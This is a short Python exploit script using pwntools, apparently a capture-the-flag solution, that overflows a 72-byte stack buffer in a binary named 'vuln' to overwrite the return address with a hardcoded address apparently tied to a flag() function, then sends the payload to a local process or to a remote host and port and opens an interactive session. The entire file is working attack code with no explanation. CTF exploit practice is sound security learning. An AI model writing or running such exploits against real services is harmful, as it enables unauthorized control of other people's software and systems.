import pwn
import argparse


parser = argparse.ArgumentParser()
parser.add_argument("choice", type=str, choices={"local", "remote"})
parser.add_argument("--target", "-t", type=str, required=False)
parser.add_argument("--port", "-p", type=int, default=0, required=False)

args = parser.parse_args()

elf = pwn.ELF("./vuln")

# Buffer overflow at 72 bytes
# The address of flag() function
new_rip = pwn.p64(elf.symbols["flag"])
return_main = pwn.p64(elf.symbols["main"])

print(new_rip)
print(pwn.p64(0x40123b))

#return_main = pwn.p64(elf.symbols["main"])

payload = b"".join(
        [
            b"A" * 72,
            pwn.p64(0x40123b),
            return_main,
        ]
    )

payload += b"\n"
if args.choice == "local":
    p = elf.process()

elif args.choice == "remote":
    if not args.target or not args.port:
        pwn.warning("Supply -t <target> -p <port>")
        exit()
    p = pwn.remote(args.target, args.port)

p.sendline(payload)
p.interactive()
